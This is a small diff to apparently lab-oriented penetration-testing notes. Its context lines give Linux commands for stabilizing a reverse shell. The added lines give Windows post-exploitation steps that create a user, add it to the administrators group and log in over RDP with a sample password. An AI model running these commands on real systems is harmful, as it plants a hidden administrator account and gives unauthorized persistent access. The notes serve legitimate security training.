@@ -574,9 +574,15 @@ Reverse and Bind shells are an essential technique for gaining remote code execu
 
 ## Commands for stabilizing shell
 
+Linux:
 1. `python -c 'import pty;pty.spawn("/bin/bash")'`
 2. `export TERM=xterm`
 3. Background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`
+
+Windows:
+1. Create a new user: `net user <username> <password> /add`
+2. Add it to the administrators group: `net localgroup administrators <username> /add`
+3. Login over RDP or WinRM: `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'`
 
 ## Windows simple Webshell script
 
